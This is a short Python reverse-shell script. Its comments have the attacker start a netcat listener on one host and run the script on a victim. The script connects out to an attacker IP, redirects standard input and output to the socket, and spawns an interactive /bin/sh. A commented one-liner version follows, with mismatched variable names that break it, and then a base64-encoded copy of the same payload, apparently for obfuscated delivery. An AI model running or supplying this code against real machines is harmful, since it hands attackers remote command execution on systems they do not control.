#!/usr/bin/env python

# first, run "nc -nvlp 80" on "mallory"
# then run this code on "alice"

import socket,subprocess,os

ATKIP = "127.0.0.1" # enter your IP here
ATKPORT = 80 # usually port 80 is open in firewalls

# build socket for shipping shell
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ATKIP,ATKPORT))

# use dup2 to redirect the std[in,out,err] to the socket's file descriptor
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

# fork process to execute /bin/sh, -i will force interactivity
p=subprocess.call(["/bin/sh","-i"])

#import socket,subprocess,os;TKIP = "192.168.1.1";TKPORT = 80;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((ATKIP,ATKPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])
#aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO1RLSVAgPSAiMTkyLjE2OC4xLjEiO1RLUE9SVCA9IDgwO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoQVRLSVAsQVRLUE9SVCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0p
